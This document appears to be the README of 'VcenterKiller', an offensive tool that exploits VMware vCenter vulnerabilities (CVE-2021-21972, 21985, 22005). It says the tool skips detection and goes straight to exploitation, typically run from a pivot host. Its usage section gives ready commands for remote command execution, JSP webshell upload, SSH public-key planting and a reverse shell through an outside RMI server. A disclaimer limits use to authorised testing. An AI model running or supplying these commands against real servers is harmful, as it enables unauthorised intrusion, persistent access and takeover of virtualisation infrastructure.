# VcenterKiller
#### 0.必读
目前本工具处于刚上线阶段，可能会有很多BUG，如果遇到bug请提issue

后续会集成基于CVE-2021-21985一键添加管理员用户的功能，这样就不必非要在服务器执行ldap_adduer脚本了。

以及vcenter的log4j

Vmware workstation One Access ...

VMware vRealize Operations Manager ...
#### 1.它是什么

一款针对Vcenter的综合利用工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-2205，提供一键上传webshell，命令执行或者上传公钥使用SSH连接

#### 2.它的定位

一般Vcenter都放在内网，并且漏洞特征也都是烂大街，像什么fscan啦一扫就出来了，那么VcenterKiller就不是用来检测目标是否存在漏洞的，而是直接尝试利用，一般通过CS/MSF在跳板上来执行，所以去掉了其余花里胡哨的输出。

#### 3.使用方法

```bash
go build -o main.exe

./main.exe -u https://192.168.1.1 -m 21985 -c whoami
./main.exe -u https://192.168.1.1 -m 22005 -f test.jsp
./main.exe -u https://192.168.1.1 -m 21972 -f test.jsp
./main.exe -u https://192.168.1.1 -m 21972 -f id_rsa.pub -t ssh //传公钥
./main.exe -u https://192.168.1.1 -m 21985 -t rshell -r rmi://xx.xx.xx.xx:1099/xx
```

#### 4.免责声明

本工具仅面向**合法授权**的企业安全建设行为，例如企业内部攻防演练、漏洞验证和复测，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标使用。**

如您在使用本工具的过程中存在任何非法行为，**您需自行承担相应后果**，我们将不承担任何法律及连带责任。

#### 5.更新日志

针对CVE-2021-21985添加了利用rmi反弹shell的功能，前提是你要启动一个rmi服务器，例如jndi-injection-exploit
